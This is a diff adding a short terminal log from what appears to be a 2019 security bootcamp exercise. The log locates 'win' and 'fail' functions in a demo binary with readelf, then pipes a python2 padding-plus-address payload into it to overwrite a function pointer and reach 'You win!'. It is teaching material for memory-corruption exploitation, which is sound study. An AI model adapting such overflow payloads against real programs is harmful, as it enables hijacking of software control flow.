@@ -1,0 +1,12 @@
+└[~/bootcamp-2019/pwn/demos/Day1]% readelf -s 05_out_of_bounds_fptr| grep fail                         (git)-[master]
+    49: 0000000000401159    19 FUNC    GLOBAL DEFAULT   13 fail
+┌[gh0s1@silvestris]
+└[~/bootcamp-2019/pwn/demos/Day1]% readelf -s 05_out_of_bounds_fptr| grep win                          (git)-[master]
+    60: 0000000000401146    19 FUNC    GLOBAL DEFAULT   13 win
+
+
+[~/bootcamp-2019/pwn/demos/Day1]% python2 -c 'print "A" * 88 + "\x46\x11\x40"' | ./05_out_of_bounds_fptr
+Welcome to basic memory corruption examples
+Send me your input:
+Currently target is: 0x401146
+You win!┌
